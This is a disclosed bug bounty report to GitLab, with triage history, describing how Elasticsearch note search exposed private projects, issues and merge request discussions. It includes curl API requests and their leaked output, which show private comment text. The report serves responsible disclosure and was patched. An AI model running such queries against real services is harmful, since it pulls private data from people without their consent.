{"id":710006,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MTAwMDY=","url":"https://hackerone.com/reports/710006","title":"Elasticsearch leaks data through the notes scope","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-10-08T21:45:57.718Z","submitted_at":"2019-10-08T21:45:57.718Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rpadovani","url":"/rpadovani","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-10-06T21:57:20.940Z","bug_reporter_agreed_on_going_public_at":"2020-10-06T21:57:20.764Z","team_member_agreed_on_going_public_at":"2020-10-06T19:24:47.151Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nThe Elasticsearch results, when filtering using the `notes` scope, leaks data about private groups, private projects, and private issues.\n\n### Steps to reproduce\n\n1. Search, as an anonymous user, `nextbit` in the Gitlab group, filtering for \"comments\" ([link](https://gitlab.com/search?group_id=9970\u0026repository_ref=\u0026scope=notes\u0026search=nextbit\u0026snippets=))\n2. You will have as result a private note saying `Riccardo Padovani mentioned in nextbit/virtualcore/gui#109` (see screenshot). This basically leaks information about the existence of a private group, a private subgroup, a private project, the ID of an issue in the project, and a membership of the project. 3. You can also retrieve more data through the APIs:\n\n```\n19:55:18 in ~ \nâžœ curl \"https://gitlab.com/api/v4/projects/278964/search?scope=notes\u0026search=nextbit\" --header \"PRIVATE-TOKEN: TEST\" | jq\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   520  100   520    0     0    508      0  0:00:01  0:00:01 --:--:--   508\n[\n  {\n    \"id\": 215547575,\n    \"type\": null,\n    \"body\": \"mentioned in issue nextbit/VirtualCore/gui#109\",\n    \"attachment\": null,\n    \"author\": {\n      \"id\": 16048,\n      \"name\": \"Riccardo Padovani\",\n      \"username\": \"rpadovani\",\n      \"state\": \"active\",\n      \"avatar_url\": \"https://secure.gravatar.com/avatar/9d89d4072afb4457b0c49131d8d258f5?s=80\u0026d=identicon\",\n      \"web_url\": \"https://gitlab.com/rpadovani\"\n    },\n    \"created_at\": \"2019-02-19T12:54:23.670Z\",\n    \"updated_at\": \"2019-02-19T12:54:23.670Z\",\n    \"system\": true,\n    \"noteable_id\": 24685040,\n    \"noteable_type\": \"Issue\",\n    \"resolvable\": false,\n    \"noteable_iid\": 25362\n  }\n]\n``` \n\nThe token used is from another account, whom doesn't have access to `nextbit`, or doesn't have any relation with the mentioned issue. It is necessary 'cause search APIs can be used only by logged users.\n\nThe ID of the project where we perform the search is the Gitlab one.\n\n### Impact\n\nElasticsearch doesn't properly authorize access to the notes in search results, so there are leaks of private data, given the right search query.\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n## Impact\n\nElasticsearch doesn't properly authorize access to the notes in search results, so there are leaks of private data, given the right search query","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":602827,"file_name":"Screenshot_2019-10-08_nextbit___Search.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9uSDK8vSE3RzyjJ1DYUdBgf1?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-10-08_nextbit___Search.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-10-08_nextbit___Search.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151924Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=89c32c55c9329579ebb2ea0f98de1e8933135ceac05d5d0caec8c7181dcd2248","file_size":56080,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":7,"voters":["thaivu","since2003","exception","cryptographer","mohanan_t","artkulak","horsebackhacker"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5990101,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @rpadovani,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2019-10-08T22:10:24.983Z","updated_at":"2019-10-08T22:10:24.983Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5990105,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-10-08T22:10:55.502Z","updated_at":"2019-10-08T22:10:55.502Z","additional_data":{"old_severity":"High (8.6)","new_severity":"Low","old_severity_id":533981,"new_severity_id":533990},"actor":{"username":"akelly","cleared":false,"url":"/akelly","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5990113,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-10-08T22:12:51.460Z","updated_at":"2019-10-08T22:12:51.460Z","additional_data":{"old_severity":"Low","new_severity":"High","old_severity_id":533990,"new_severity_id":533991},"actor":{"username":"akelly","cleared":false,"url":"/akelly","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5990118,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @rpadovani,\n\nThank you for submitting this report. We appreciate the time and effort that goes into your reports.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/issues/33660.  This issue will be made public 30 days following the release of a patch.\n\nJust as a heads up, please be aware that we may end up changing the severity on this report. In general these namespace disclosures usually get considered Low, but there may be other factors that make it higher. Once we have some more information about the impact of the finding I am happy to bring it up to the team and revisit this. In the meantime, we have disabled Elasticsearch just to be safe.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nAndrew\nSecurity Team | GitLab Inc.","automated_response":false,"created_at":"2019-10-08T22:13:44.707Z","updated_at":"2019-10-08T22:13:44.707Z","actor":{"username":"akelly","cleared":false,"url":"/akelly","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5990132,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @akelly,\nthanks for the fast response time!\n\nI totally understand that: I left the \"high\" severity because I haven't fully investigated the possible ramification of this, and I left the one from the previous reports. As far as it stands from my report, it is indeed a minor issue. \nIf it is how I think, all the `system notes` are leaked. These notes contain also other data, like milestones, epics, assignees and so on. Still, only _metadata_, so I totally agree with lowering the severity!\n\nKeep up the good work :-)\n\n","automated_response":false,"created_at":"2019-10-08T22:19:31.100Z","updated_at":"2019-10-08T22:19:31.100Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6037450,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-10-14T19:24:24.125Z","updated_at":"2019-10-14T19:24:24.125Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":533991,"new_severity_id":538541},"actor":{"username":"akelly","cleared":false,"url":"/akelly","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6037471,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @rpadovani,\n\nThank you again for the report! Your finding has been reviewed and we are awarding a bounty prior the release of a patch. Congratulations!\n\nWe will continue to keep you updated via HackerOne as a fix is scheduled.\n\nBest regards,\nAndrew\nSecurity Team | GitLab Inc.\n","automated_response":false,"created_at":"2019-10-14T19:27:57.419Z","updated_at":"2019-10-14T19:27:57.419Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"rpadovani","url":"/rpadovani"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6219715,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @rpadovani,\n\nThank you again for the report! Your finding has been patched in GitLab version 12.4.1. Congratulations!\n\nWe have reactivated Elasticsearch in production: please let us know if you find that our patch does not mitigate your finding. \nYour report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nSecurity Team | GitLab Inc.\n","automated_response":false,"created_at":"2019-11-05T10:10:16.261Z","updated_at":"2019-11-05T10:10:16.261Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"rpadovani","url":"/rpadovani"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6220154,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jmatos_bgtvf \n\nThanks for the bounty, but unfortunately the fix doesn't seems to work. \n\nI am still able to retrieve notes I shouldn't retrieve: although this time only through APIs and not through the UI:\n\nI am using a token that doesn't have access to the project mentioned in the note, as you can see from the next two APIs requests:\n\n``` \n11:32:29 in ~ \nâžœ curl \"https://gitlab.com/api/v4/projects/278964/search?scope=notes\u0026search=nextbit\" --header \"PRIVATE-TOKEN: token\" | jq    \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   520  100   520    0     0    689      0 --:--:-- --:--:-- --:--:--   688\n[\n  {\n    \"id\": 215547575,\n    \"type\": null,\n    \"body\": \"mentioned in issue nextbit/VirtualCore/gui#109\",\n    \"attachment\": null,\n    \"author\": {\n      \"id\": 16048,\n      \"name\": \"Riccardo Padovani\",\n      \"username\": \"rpadovani\",\n      \"state\": \"active\",\n      \"avatar_url\": \"https://secure.gravatar.com/avatar/9d89d4072afb4457b0c49131d8d258f5?s=80\u0026d=identicon\",\n      \"web_url\": \"https://gitlab.com/rpadovani\"\n    },\n    \"created_at\": \"2019-02-19T12:54:23.670Z\",\n    \"updated_at\": \"2019-02-19T12:54:23.670Z\",\n    \"system\": true,\n    \"noteable_id\": 24685040,\n    \"noteable_type\": \"Issue\",\n    \"resolvable\": false,\n    \"noteable_iid\": 25362\n  }\n]\n\n11:32:47 in ~ \nâžœ curl \"https://gitlab.com/api/v4/projects?search=virtualcore\" --header \"PRIVATE-TOKEN: token\" | jq               \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100     2  100     2    0     0      3      0 --:--:-- --:--:-- --:--:--     3\n[]\n\n11:32:56 in ~ \nâžœ curl \"https://gitlab.com/api/v4/projects?search=VirtualCore\" --header \"PRIVATE-TOKEN: token\" | jq\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100     2  100     2    0     0      3      0 --:--:-- --:--:-- --:--:--     3\n[]\n```\n\nI think you can verify yourself going to https://gitlab.com/api/v4/projects/278964/search?scope=notes\u0026search=nextbit\n\nYou see the note about nextbit/VirtualCore/gui, but you don't have access to https://gitlab.com/nextbit (or we are colleagues and I didn't know about it :-D)","automated_response":false,"created_at":"2019-11-05T10:37:02.745Z","updated_at":"2019-11-05T10:37:34.485Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6220216,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, please notice that also all the information about private merge requests are leaked through the `comments` section.\n\nAs you know, the code / MR / pipelines of customers.gitlab.com are private, but I still can access them (see screenshot)\n\n","automated_response":false,"created_at":"2019-11-05T10:47:34.651Z","updated_at":"2019-11-05T10:47:34.651Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":626232,"filename":"Screenshot_2019-11-05____Search.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AXNq1DndGxb3gJ2HGYDGXLor?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-11-05____Search.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-11-05____Search.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151924Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b485943ec5502dc5e4a6d7759da04e4b329744033eb90f22e98454fa66ea82ba"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6220238,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, please notice that with the APIs I can access much more information, namely the complete discussions over each MR. I am going to cut the API call to just one reply:\n\n```\n11:50:14 in ~ took 2s \nâžœ curl \"https://gitlab.com/api/v4/projects/2670515/search?scope=notes\u0026search=*\u0026per_page=1\" --header \"PRIVATE-TOKEN: token\" | jq\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1682  100  1682    0     0   1752      0 --:--:-- --:--:-- --:--:--  1750\n[\n  {\n    \"id\": 239870202,\n    \"type\": \"DiscussionNote\",\n    \"body\": \"@vitallium, would you like to give the front end a once over after the changes that I've made?\\n\\n@tyleramos, would you please give the newly added matcher and implementation for testing the tracking from feature tests?\\n\\nBoth please note that the tracking code was out of date and incorrect. There was actually a bug logged a long time ago and so the implementation here wasn't in sync with what's being used within the gitlab product. I didn't tackle all the issues there, but I fixed it up enough that it's tracking correctly now. @eli_kastelein, @mpeychet you might not want to trust current customers tracking data because it's using a broken version (2.10.2) with the local storage setting -- https://discourse.snowplowanalytics.com/t/session-not-tracked-correctly/3026, and fixed in https://github.com/snowplow/snowplow-javascript-tracker/pull/761. When I implemented the tests for tracking I uncovered this, and the result appears to be that when an event was added it would just retrack the initial event that was logged. This means you might have really inflated data, and I'd recommend clearing it out if that's possible and you can confirm I'm correct.\",\n    \"attachment\": null,\n    \"author\": {\n      \"id\": 4303974,\n      \"name\": \"Jeremy Jackson\",\n      \"username\": \"jejacks0n\",\n      \"state\": \"active\",\n      \"avatar_url\": \"https://assets.gitlab-static.net/uploads/-/system/user/avatar/4303974/avatar.png\",\n      \"web_url\": \"https://gitlab.com/jejacks0n\"\n    },\n    \"created_at\": \"2019-11-04T21:10:41.148Z\",\n    \"updated_at\": \"2019-11-05T07:33:07.584Z\",\n    \"system\": false,\n    \"noteable_id\": 39021260,\n    \"noteable_type\": \"MergeRequest\",\n    \"resolvable\": true,\n    \"resolved\": false,\n    \"resolved_by\": null,\n    \"noteable_iid\": 520\n  }\n]\n```\n\nI also think that since not only metadata are leaked, but actually data, the severity of this vulnerability is actually higher","automated_response":false,"created_at":"2019-11-05T10:51:44.555Z","updated_at":"2019-11-05T10:51:44.555Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6220312,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the very fast feedback @rpadovani,\n\nCould you please open a new report ?\nWe will disable Elasticsearch ASAP.\n\nBest regards,\nSecurity Team | GitLab Inc.","automated_response":false,"created_at":"2019-11-05T11:02:23.065Z","updated_at":"2019-11-05T11:02:23.065Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6220357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your fast acknowledgement. I have followed up with #729760.","automated_response":false,"created_at":"2019-11-05T11:13:46.926Z","updated_at":"2019-11-05T11:13:46.926Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9438589,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-06T19:24:47.187Z","updated_at":"2020-10-06T19:24:47.187Z","first_to_agree":true,"actor":{"username":"akelly","cleared":false,"url":"/akelly","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9439530,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-06T21:57:20.787Z","updated_at":"2020-10-06T21:57:20.787Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9439531,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-10-06T21:57:20.965Z","updated_at":"2020-10-06T21:57:20.965Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}